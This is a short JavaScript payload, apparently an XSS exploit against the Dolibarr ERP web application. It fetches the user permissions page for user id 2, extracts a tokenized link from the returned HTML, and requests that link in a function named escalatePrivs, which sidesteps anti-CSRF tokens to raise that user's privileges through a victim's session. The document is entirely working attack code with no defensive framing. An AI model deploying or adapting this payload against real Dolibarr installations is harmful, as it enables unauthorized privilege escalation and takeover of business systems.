function read_body(xhr) {

    var data = xhr.responseXML;
    var tokenizedUrl = data.getElementsByClassName("reposition commonlink")[0].href;
    console.log(tokenizedUrl);
    return tokenizedUrl;

}

function escalatePrivs() {
    var url = read_body(xhr);
    var http = new XMLHttpRequest();
    http.open('GET', url);
    http.onreadystatechange = function() {
            if (this.readyState  === XMLHttpRequest.DONE && this.status === 200) {
                    return;
            }
    };
    http.send(null);
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
            read_body(xhr);
            escalatePrivs(xhr);
    }
}
xhr.open('GET', '/dolibarr/htdocs/user/perms.php?id=2', true);